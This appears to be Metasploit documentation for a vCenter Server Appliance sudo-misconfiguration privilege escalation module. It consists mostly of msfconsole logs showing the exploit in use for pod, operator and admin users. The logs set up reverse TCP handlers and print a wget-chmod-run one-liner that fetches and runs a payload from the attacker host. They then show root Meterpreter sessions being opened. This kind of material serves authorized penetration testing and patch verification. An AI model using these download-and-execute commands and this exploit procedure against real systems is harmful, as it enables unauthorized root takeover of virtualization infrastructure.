## Vulnerable Application

VMware vCenter Server < 7.0.3 update R and < 8.0.2 update D
contains multiple local privilege escalation vulnerabilities
due to misconfiguration of sudo. An authenticated local user
with non-administrative privileges may exploit these issues
to elevate privileges to root on vCenter Server Appliance.

Tested against VMware vCenter Server Appliance 8.0.0.10000 20519528

## Verification Steps

1. Install the application
2. Start msfconsole
3. Get an initial user level shell
4. Do: `use exploit/linux/local/vcenter_sudo_lpe`
5. Do: `set lhost <lhost>`
6. Do: `set sessoin <session>`
7. Do: `run`
8. You should get a root shell.

## Options

## Scenarios

### VMware vCenter Server Appliance 8.0.0.10000 (VMware-VCSA-all-8.0.0-20519528.iso)

#### `pod` user

Start our first handler

```
[msf](Jobs:0 Agents:0) > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set lhost 2.2.2.2
lhost => 2.2.2.2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set srvport 8181
srvport => 8181
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set target 7
target => 7
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Using URL: http://2.2.2.2:8181/wS8RErnHVLh
[*] Server started.
[*] Run the following command on the target machine:
wget -qO 5Y0wnQU5 --no-check-certificate http://2.2.2.2:8181/wS8RErnHVLh; chmod +x 5Y0wnQU5; ./5Y0wnQU5& disown
```

Setup, SSH in, start a shell, allow `pod` login access, then change user and start our payload.

```
PS C:\Users\h00die> ssh root@1.1.1.1

VMware vCenter Server Appliance 8.0.0.10000

(root@1.1.1.1) Password:
Connected to service

    * List APIs: "help api list"
    * List Plugins: "help pi list"
    * Launch BASH: "shell"

Command> api com.vmware.appliance.version1.system.version.get
Version:
   Version: 8.0.0.10000
   Product: VMware vCenter Server
   Build: 20519528
   Type: ''
   Summary: VMware vCenter Server 8.0
   Releasedate: October 11, 2022
   Installtime: ''

Command> shell
Shell access is granted to root
root@localhost [ ~ ]# usermod -s /bin/bash pod
/usr/sbin/usermod.bk -s /bin/bash pod
root@localhost [ ~ ]# su pod
pod@localhost [ /root ]$ cd /tmp
pod@localhost [ /tmp ]$ wget -qO smswhnVK --no-check-certificate http://2.2.2.2:8181/xLaIAPnwiuPr9; chmod +x smswhnVK; ./smswhnVK& disown
[1] 22325
```

Priv Esc. Autocheck disabled due to an incomplete install.

```
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/tmp) > getuid
Server username: pod
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > use exploit/linux/local/vcenter_sudo_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set session 1
session => 1
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set verbose true
verbose => true
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set lport 9879
lport => 9879
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set autocheck false
autocheck => false
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > run

[*] Started reverse TCP handler on 2.2.2.2:9879 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Utilizing VMWARE_PYTHON_PATH exploitation method for pod user.
[*] Creating directory /tmp/appliance
[*] /tmp/appliance created
[*] Writing '/tmp/appliance/9OP6wIQJl9' (250 bytes) ...
[*] Launching exploit...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 1.1.1.1
[+] Deleted /tmp/appliance/9OP6wIQJl9
[+] Deleted /tmp/appliance/__init__.py
[+] Deleted /tmp/appliance
[*] Meterpreter session 2 opened (2.2.2.2:9879 -> 1.1.1.1:34894) at 2024-11-18 07:24:13 -0500

(Meterpreter 2)(/tmp) > getuid
Server username: root
(Meterpreter 2)(/tmp) > background
[*] Backgrounding session 2...
[msf](Jobs:1 Agents:2) exploit(linux/local/vcenter_sudo_lpe) > sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/tmp) > getuid
Server username: pod
```

#### Operator Group

If the user `mal` exists, use that. If not, follow the bellow instructions

Make a user in the operator group:

```
sudo useradd -m -s /bin/bash operator1
sudo usermod -aG users operator1
sudo usermod -aG operator operator1
```

This may be enough, but on my install which didn't complete I had to add the sudo entry manually.

```
visudo
```

Add the following at the end:

```
User_Alias PYTHON_USERS = operator1
Defaults:PYTHON_USERS env_keep += "PYTHONPATH"
```

Start our first handler

```
[msf](Jobs:0 Agents:0) > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set lhost 2.2.2.2
lhost => 2.2.2.2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set srvport 8181
srvport => 8181
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set target 7
target => 7
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Using URL: http://2.2.2.2:8181/eEgibKL2K
[*] Server started.
[*] Run the following command on the target machine:
wget -qO JSlY5cPV --no-check-certificate http://2.2.2.2:8181/eEgibKL2K; chmod +x JSlY5cPV; ./JSlY5cPV& disown
[*] Sending stage (3045380 bytes) to 1.1.1.1
[*] Meterpreter session 1 opened (2.2.2.2:4444 -> 1.1.1.1:56166) at 2024-11-18 16:27:17 -0500
```

Priv Esc. Autocheck disabled due to an incomplete install.

```
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) > use exploit/linux/local/vcenter_sudo_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:0) exploit(linux/local/vcenter_sudo_lpe) > set lhost 2.2.2.2
lhost => 2.2.2.2
[msf](Jobs:1 Agents:0) exploit(linux/local/vcenter_sudo_lpe) > set lport 9870
lport => 9870
[msf](Jobs:1 Agents:0) exploit(linux/local/vcenter_sudo_lpe) > set verbose true
verbose => true
[msf](Jobs:1 Agents:0) exploit(linux/local/vcenter_sudo_lpe) > set autocheck false
autocheck => false
[msf](Jobs:1 Agents:0) exploit(linux/local/vcenter_sudo_lpe) > set session 1
session => 1
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > run

[*] Started reverse TCP handler on 2.2.2.2:9870 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Utilizing PYTHONPATH exploitation method for operator group.
[*] Writing '/tmp/Ma5gGdnt' (250 bytes) ...
[*] Launching exploit...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 1.1.1.1
[+] Deleted /tmp/Ma5gGdnt
[+] Deleted /tmp/spwd.py
[*] Meterpreter session 2 opened (2.2.2.2:9870 -> 1.1.1.1:40550) at 2024-11-18 16:27:28 -0500


(Meterpreter 2)(/tmp) > 
(Meterpreter 2)(/tmp) > getuid
Server username: root
(Meterpreter 2)(/tmp) > background
[*] Backgrounding session 2...
s[msf](Jobs:1 Agents:2) exploit(linux/local/vcenter_sudo_lpe) > sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/tmp) > getuid
Server username: operator1
```

#### Admin Group

If the user `admin` exists, use that. If not, follow the bellow instructions

Make a user in the operator group:

```
useradd -m -s /bin/bash admin
usermod -aG admin admin
usermod -aG users admin
```

Start our first handler

```
[msf](Jobs:0 Agents:0) > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set lhost 2.2.2.2
lhost => 2.2.2.2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set srvport 8181
srvport => 8181
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set target 7
target => 7
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Using URL: http://2.2.2.2:8181/Hul7qG
[*] Server started.
[*] Run the following command on the target machine:
wget -qO IsMq60f5 --no-check-certificate http://2.2.2.2:8181/Hul7qG; chmod +x IsMq60f5; ./IsMq60f5& disown
[*] Sending stage (3045380 bytes) to 1.1.1.1
[*] Meterpreter session 1 opened (2.2.2.2:4444 -> 1.1.1.1:56166) at 2024-11-18 16:27:17 -0500
```

Priv Esc

```
[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) > use exploit/linux/local/vcenter_sudo_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set lhost 2.2.2.2
lhost => 2.2.2.2
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set lport 9870
lport => 9870
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set verbose true
verbose => true
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set autocheck false
autocheck => false
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > set session 1
session => 1
[msf](Jobs:1 Agents:1) exploit(linux/local/vcenter_sudo_lpe) > run

[*] Started reverse TCP handler on 2.2.2.2:9870 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Exploitable version detected: 8.0.0.20519528
[+] User is vulnerable
[+] The target appears to be vulnerable. Version 8.0.0.20519528 and user (admin:["users", "admin"]) are vulnerable
[*] Utilizing VMWARE_PYTHON_BIN exploitation method for admin group.
[*] Creating directory /tmp/appliance
[*] /tmp/appliance created
[*] Writing '/tmp/appliance/NKdii1ux' (250 bytes) ...
[*] Launching exploit...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 1.1.1.1
[+] Deleted /tmp/appliance/NKdii1ux
[+] Deleted /tmp/appliance/__init__.py
[+] Deleted /tmp/appliance
[*] Meterpreter session 2 opened (2.2.2.2:9870 -> 1.1.1.1:58686) at 2024-11-21 04:00:08 -0500

(Meterpreter 2)(/tmp) > getuid
Server username: root
(Meterpreter 2)(/tmp) > background
[*] Backgrounding session 2...
s[msf](Jobs:1 Agents:2) exploit(linux/local/vcenter_sudo_lpe) > sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/tmp) > getuid
Server username: admin
(Meterpreter 1)(/tmp) > 
```
